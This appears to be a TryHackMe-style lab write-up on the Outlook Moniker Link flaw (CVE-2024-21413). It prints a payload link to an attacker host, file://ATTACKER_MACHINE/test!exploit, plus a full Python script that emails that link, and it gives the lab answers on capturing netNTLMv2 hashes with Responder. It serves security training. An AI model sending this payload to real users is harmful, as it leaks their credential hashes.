# Moniker Link (CVE-2024-21413)
## Task 2:
The vulnerability here exists by modifying our hyperlink to include the ! special character and some text in our Moniker Link 
which results in bypassing Outlook’s Protected View. For example: 
```<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>```

Questions:
- What Moniker Link type do we use in the hyperlink? ```file://```
- What is the special character used to bypass Outlook's "Protected View"? ```!```

## Task 3:

Questions:
Exploit code:
```
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

Questions:
- What is the name of the application that we use on the AttackBox to capture the user's hash? ```responder```
- What type of hash is captured once the hyperlink in the email has been clicked? ```netNTLMv2```

## Task 4: Detection
Yara rules, Wireshark
